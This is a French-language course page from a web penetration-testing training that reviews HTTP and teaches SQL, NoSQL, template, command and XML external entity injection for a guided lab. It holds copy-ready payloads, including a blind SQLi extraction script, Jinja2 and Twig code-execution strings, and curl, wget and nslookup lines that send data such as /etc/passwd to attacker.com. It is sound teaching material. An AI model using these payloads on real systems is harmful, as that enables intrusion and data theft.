@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>M2 — Rappels HTTP &amp; Injections avancées</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700&display=swap');
+  :root {
+    --bg: #0a0e14; --bg-card: #131820; --bg-card-hover: #1a2332;
+    --border: #1e2d3d; --accent: #e63946; --accent2: #ff6b6b;
+    --text: #bfc7d5; --text-muted: #6b7a8d; --text-bright: #e6ecf3;
+    --green: #44d7b6; --orange: #ff9f43; --blue: #54a0ff; --purple: #a55eea;
+    --code-bg: #0d1117;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.6; }
+  .bg-grid { position: fixed; top:0;left:0;right:0;bottom:0; background-image: linear-gradient(rgba(230,57,70,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(230,57,70,0.03) 1px, transparent 1px); background-size:40px 40px; pointer-events:none; z-index:0; }
+  .container { max-width: 960px; margin:0 auto; padding:0 24px; position:relative; z-index:1; }
+
+  .back-link { display: inline-flex; align-items: center; gap: 8px; color: var(--text-muted); text-decoration: none; font-size: 0.85rem; margin: 30px 0 20px; transition: color 0.2s; }
+  .back-link:hover { color: var(--accent2); }
+
+  .module-hero { background: var(--bg-card); border:1px solid var(--border); border-radius:12px; padding: 40px; margin-bottom: 40px; border-left: 5px solid var(--blue); }
+  .module-hero .tag { font-family: 'Fira Code', monospace; font-size: 0.8rem; background: rgba(84,160,255,0.15); color: var(--blue); padding: 4px 14px; border-radius: 20px; display: inline-block; margin-bottom: 16px; }
+  .module-hero h1 { font-size: 2rem; color: var(--text-bright); font-weight: 700; margin-bottom: 8px; }
+  .module-hero .meta { font-size: 0.9rem; color: var(--text-muted); font-family: 'Fira Code', monospace; }
+  .module-hero .desc { margin-top: 16px; color: var(--text); font-size: 0.95rem; line-height: 1.7; }
+
+  .section { margin-bottom: 40px; }
+  .section h2 { font-size: 1.25rem; color: var(--text-bright); margin-bottom: 16px; padding-bottom: 10px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
+  .section h2 .num { width: 32px; height: 32px; border-radius: 8px; display: inline-flex; align-items: center; justify-content: center; font-family: 'Fira Code', monospace; font-size: 0.85rem; font-weight: 600; background: rgba(84,160,255,0.12); color: var(--blue); }
+
+  .card { background: var(--bg-card); border:1px solid var(--border); border-radius:10px; padding: 24px; margin-bottom: 16px; }
+  .card h3 { font-size: 1.05rem; color: var(--text-bright); margin-bottom: 10px; }
+  .card p, .card li { font-size: 0.93rem; color: var(--text-muted); line-height: 1.7; }
+  .card ul, .card ol { padding-left: 20px; margin-top: 8px; }
+  .card li { margin-bottom: 6px; }
+
+  .code-block { position: relative; margin: 12px 0; border-radius: 8px; border: 1px solid var(--border); overflow: hidden; }
+  .code-block pre { background: var(--code-bg); padding: 18px 20px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.85rem; line-height: 1.6; color: var(--text); margin: 0; }
+  .copy-btn { position: absolute; top: 8px; right: 10px; background: var(--bg-card); border: 1px solid var(--border); color: var(--text-muted); padding: 4px 12px; border-radius: 5px; cursor: pointer; font-family: 'Fira Code', monospace; font-size: 0.75rem; transition: all 0.2s; display: flex; align-items: center; gap: 5px; }
+  .copy-btn:hover { color: var(--text-bright); border-color: var(--blue); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+  .highlight { color: var(--accent2); font-weight: 500; }
+  .green { color: var(--green); }
+  .blue { color: var(--blue); }
+  .orange { color: var(--orange); }
+
+  .attck-tag { font-family: 'Fira Code', monospace; font-size: 0.75rem; background: rgba(68,215,182,0.1); color: var(--green); padding: 2px 8px; border-radius: 4px; margin-left: 6px; white-space: nowrap; }
+
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media (max-width: 768px) { .two-col { grid-template-columns: 1fr; } }
+
+  footer { text-align: center; padding: 40px 0; color: var(--text-muted); font-size: 0.82rem; border-top: 1px solid var(--border); margin-top: 20px; }
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="container">
+
+<a href="../index.html" class="back-link">&larr; Retour au sommaire</a>
+
+<div class="module-hero">
+  <span class="tag">Module 2</span>
+  <h1>Rappels HTTP &amp; Injections avancées</h1>
+  <p class="meta">J1 &middot; 11h15—12h30 &middot; 1h15 &middot; Théorie + TP guidé pas à pas</p>
+  <p class="desc">
+    Révision du protocole HTTP essentiel au pentest web, suivie d'une plongée dans les injections avancées : SQLi, NoSQLi, SSTI, Command Injection, XXE. Chaque injection est immédiatement taggée <span class="green">MITRE ATT&amp;CK</span>. TP guidé pas à pas sur le lab.
+  </p>
+</div>
+
+<!-- 1. Rappels HTTP -->
+<div class="section">
+  <h2><span class="num">1</span> Rappels HTTP essentiels</h2>
+
+  <div class="card">
+    <h3>Cycle requête/réponse</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'http-cycle')">&#128203; Copier</button>
+      <pre id="http-cycle"># Requête HTTP typique
+GET /login HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0
+Cookie: session=eyJhbGciOiJIUzI1NiIs...
+Authorization: Bearer eyJ...
+
+# Réponse HTTP
+HTTP/1.1 200 OK
+Set-Cookie: session=new_value; HttpOnly; Secure; SameSite=Lax
+Content-Type: text/html
+Content-Length: 1234</pre>
+    </div>
+  </div>
+
+  <div class="two-col">
+    <div class="card">
+      <h3>&#128274; Cookies &amp; Attributs</h3>
+      <ul>
+        <li><code>HttpOnly</code> : inaccessible via JS (protection XSS)</li>
+        <li><code>Secure</code> : envoyé uniquement en HTTPS</li>
+        <li><code>SameSite</code> : Lax / Strict / None (protection CSRF)</li>
+        <li><code>Domain</code> &amp; <code>Path</code> : scope du cookie</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>&#128274; Headers de sécurité</h3>
+      <ul>
+        <li><code>CSP</code> (Content-Security-Policy)</li>
+        <li><code>HSTS</code> (Strict-Transport-Security)</li>
+        <li><code>X-Frame-Options</code></li>
+        <li><code>Access-Control-Allow-Origin</code> (CORS)</li>
+        <li>Leur absence = vulnérabilité exploitable</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Méthodologie de pentest web</h3>
+    <p>
+      <span class="highlight">1. Reconnaissance</span> <span class="attck-tag">T1592</span> &rarr;
+      <span class="highlight">2. Mapping</span> (endpoints, params) &rarr;
+      <span class="highlight">3. Identification</span> (versions, technos) &rarr;
+      <span class="highlight">4. Exploitation</span> <span class="attck-tag">T1190</span> &rarr;
+      <span class="highlight">5. Post-exploitation</span> <span class="attck-tag">T1505.003</span>
+    </p>
+  </div>
+</div>
+
+<div class="card" style="border-left: 4px solid var(--purple);">
+  <h3>NIS2 &amp; Sécurité des applications web</h3>
+  <p>La directive NIS2 (art. 21) impose aux entités essentielles et importantes des mesures de gestion des risques incluant la sécurité de la chaîne d'approvisionnement logicielle, le codage sécurisé et les tests d'intrusion réguliers. Les injections (SQLi, SSTI, Command Injection) restent les vulnérabilités les plus exploitées contre les applications web des OIV et OSE.</p>
+</div>
+
+<!-- 2. SQLi -->
+<div class="section">
+  <h2><span class="num">2</span> SQL Injection avancée <span class="attck-tag">T1190</span></h2>
+
+  <div class="card">
+    <h3>Types de SQLi</h3>
+    <table style="width:100%;border-collapse:collapse;">
+      <tr style="border-bottom:1px solid var(--border);"><th style="text-align:left;padding:8px;color:var(--text-bright);">Type</th><th style="text-align:left;padding:8px;color:var(--text-bright);">Description</th><th style="text-align:left;padding:8px;color:var(--text-bright);">Complexité</th></tr>
+      <tr style="border-bottom:1px solid var(--border);"><td style="padding:8px;">Union-based</td><td style="padding:8px;color:var(--text-muted);">Utilise UNION SELECT pour extraire des données</td><td style="padding:8px;">★☆☆</td></tr>
+      <tr style="border-bottom:1px solid var(--border);"><td style="padding:8px;">Error-based</td><td style="padding:8px;color:var(--text-muted);">Provoque des erreurs SQL contenant des données</td><td style="padding:8px;">★★☆</td></tr>
+      <tr style="border-bottom:1px solid var(--border);"><td style="padding:8px;">Boolean blind</td><td style="padding:8px;color:var(--text-muted);">Inférence bit par bit via différences de réponse</td><td style="padding:8px;">★★★</td></tr>
+      <tr style="border-bottom:1px solid var(--border);"><td style="padding:8px;">Time-based blind</td><td style="padding:8px;color:var(--text-muted);">Inférence via délais (SLEEP)</td><td style="padding:8px;">★★★</td></tr>
+      <tr style="border-bottom:1px solid var(--border);"><td style="padding:8px;">Out-of-band</td><td style="padding:8px;color:var(--text-muted);">Exfiltration via DNS/HTTP (exfiltration lourde)</td><td style="padding:8px;">★★★★</td></tr>
+      <tr><td style="padding:8px;">Second-order</td><td style="padding:8px;color:var(--text-muted);">Payload stocké puis exécuté plus tard</td><td style="padding:8px;">★★★★</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>Exemple : Time-based blind SQLi</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'sqli-time')">&#128203; Copier</button>
+      <pre id="sqli-time">-- MySQL time-based blind
+' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
+
+-- PostgreSQL time-based blind
+' OR (SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))=97) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin') --
+
+-- MSSQL time-based (via WAITFOR)
+'; IF (SELECT ASCII(SUBSTRING(name,1,1)) FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users'))=97 WAITFOR DELAY '0:0:5' --</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>TP guidé : exploitation d'une blind SQLi</h3>
+    <ol>
+      <li>Identifier le point d'injection via un délai de 5 secondes</li>
+      <li>Utiliser <strong>sqlmap</strong> avec <code>--technique=T</code> (time-based)</li>
+      <li>Écrire un script Python d'extraction caractère par caractère</li>
+    </ol>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'sqli-script')">&#128203; Copier</button>
+      <pre id="sqli-script">import requests
+import string
+
+url = "http://target.com/api/user?id=1"
+charset = string.ascii_letters + string.digits + "!@#$%^&*()"
+
+def extract_string(query, length=32):
+    result = ""
+    for pos in range(1, length+1):
+        for char in charset:
+            payload = f"1' OR IF(SUBSTRING(({query}),{pos},1)='{char}', SLEEP(2), 0) -- "
+            try:
+                r = requests.get(url, params={"id": payload}, timeout=3)
+            except requests.exceptions.Timeout:
+                result += char
+                print(f"[+] Position {pos}: {char} -> {result}")
+                break
+        else:
+            break
+    return result
+
+# Extraction du mot de passe admin
+db = extract_string("SELECT database()", 20)
+print(f"[DB] {db}")</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 3. NoSQLi -->
+<div class="section">
+  <h2><span class="num">3</span> NoSQL Injection (MongoDB) <span class="attck-tag">T1190</span></h2>
+
+  <div class="card">
+    <h3>Principe</h3>
+    <p>Quand l'application utilise MongoDB et insère directement les entrées utilisateur dans une requête NoSQL. Exploitation via les <strong>opérateurs MongoDB</strong> (<code>$ne</code>, <code>$gt</code>, <code>$regex</code>, <code>$where</code>).</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'nosql-auth')">&#128203; Copier</button>
+      <pre id="nosql-auth"># Bypass d'authentification MongoDB
+# Au lieu de {"username": "admin", "password": "xxx"}
+# On envoie :
+
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+# Extraction via $regex (blind)
+{"username": "admin", "password": {"$regex": "^a.*"}}   # test si commence par 'a'
+{"username": "admin", "password": {"$regex": "^aa.*"}}  # test si commence par 'aa'</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>NoSQLi via $where (injection JS)</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'nosql-where')">&#128203; Copier</button>
+      <pre id="nosql-where"># $where permet d'injecter du JavaScript dans MongoDB
+# Extraction via time-based
+
+{"$where": "sleep(5000) || true"}
+
+# Exfiltration plus avancée
+{"$where": "function(){ var d = new Date(); do{ var n = new Date(); } while(n-d < 5000); return true; }"}</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 4. SSTI -->
+<div class="section">
+  <h2><span class="num">4</span> SSTI — Server-Side Template Injection <span class="attck-tag">T1190</span></h2>
+
+  <div class="card">
+    <h3>Détection</h3>
+    <p>Le SSTI survient quand l'application concatène une entrée utilisateur dans un template serveur (Jinja2, Twig, Freemarker, etc.).</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'ssti-detect')">&#128203; Copier</button>
+      <pre id="ssti-detect"># Payloads de détection universels
+{{7*7}}
+{{7*'7'}}
+${{7*7}}
+#{7*7}
+<%= 7*7 %>
+
+# Si le résultat est 49 → SSTI confirmé !
+
+# Framework-specific detection
+{{config}}           # Jinja2 / Flask
+{{self}}             # Jinja2
+{{_self}}            # Twig
+${7*7}               # Freemarker
+${{7*7}}             # Velocity
+<%= File.read('/etc/passwd') %>  # ERB (Ruby)</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Exploitation Jinja2 RCE</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'ssti-rce')">&#128203; Copier</button>
+      <pre id="ssti-rce"># Jinja2 RCE via subprocess.Popen
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+# Jinja2 RCE via lipsum
+{{ lipsum.__globals__.os.popen('id').read() }}
+
+# Jinja2 RCE via config (Python 3)
+{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
+
+# Twig RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+# Freemarker RCE
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 5. Command Injection -->
+<div class="section">
+  <h2><span class="num">5</span> Command Injection <span class="attck-tag">T1059.004</span></h2>
+
+  <div class="card">
+    <h3>Opérateurs de chaînage</h3>
+    <p>Utile quand l'application appelle une commande système avec des paramètres contrôlables :</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'cmd-op')">&#128203; Copier</button>
+      <pre id="cmd-op"># Linux
+command1; command2     # exécute les deux
+command1 && command2   # exécute command2 si command1 réussit
+command1 || command2   # exécute command2 si command1 échoue
+command1 | command2    # pipe
+`command`              # substitution
+$(command)             # substitution
+
+# Blind command injection via time-based
+; sleep 5
+| sleep 5
+|| sleep 5
+
+# Blind command injection via out-of-band
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/`hostname`
+; nslookup $(cat /etc/passwd | base64).attacker.com</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 6. XXE -->
+<div class="section">
+  <h2><span class="num">6</span> XXE — XML External Entity <span class="attck-tag">T1190</span></h2>
+
+  <div class="card">
+    <h3>Payload classique</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'xxe-classic')">&#128203; Copier</button>
+      <pre id="xxe-classic">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+# Blind XXE out-of-band
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %xxe;
+]&gt;
+
+# evil.dtd hébergé chez l'attaquant :
+# &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+# &lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+# %eval;
+# %exfil;</pre>
+    </div>
+  </div>
+</div>
+
+<footer>
+  M2 — Rappels HTTP &amp; Injections avancées · Jour 1 &nbsp;|&nbsp; <a href="../index.html" style="color:var(--blue);text-decoration:none;">&larr; Sommaire</a>
+</footer>
+
+<div class="section">
+  <h2><span class="num">R</span> Références</h2>
+  <div class="card">
+    <ul>
+      <li>OWASP SQL Injection — <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">https://owasp.org/www-community/attacks/SQL_Injection</a></li>
+      <li>OWASP SSTI — <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection" target="_blank">https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection</a></li>
+      <li>OWASP Command Injection — <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">https://owasp.org/www-community/attacks/Command_Injection</a></li>
+      <li>OWASP XXE — <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>
+      <li>OWASP NoSQL Injection — <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" target="_blank">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection</a></li>
+      <li>PortSwigger — SQL Injection Cheat Sheet — <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
+      <li>HackTricks — SSTI — <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
+      <li>PayloadsAllTheThings — <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
+      <li>ANSSI — Recommandations de sécurité pour un site web — <a href="https://cyber.gouv.fr/publications/recommandations-de-securite-pour-la-mise-en-oeuvre-dun-site-web" target="_blank">https://cyber.gouv.fr/publications/recommandations-de-securite-pour-la-mise-en-oeuvre-dun-site-web</a></li>
+      <li>sqlmap — <a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a></li>
+    </ul>
+  </div>
+</div>
+
+</div>
+
+<script>
+function copyCode(btn, id) {
+  const el = document.getElementById(id);
+  navigator.clipboard.writeText(el.innerText).then(() => {
+    btn.innerHTML = '&#10003; Copié !';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.innerHTML = '&#128203; Copier'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+</script>
+</body>
+</html>
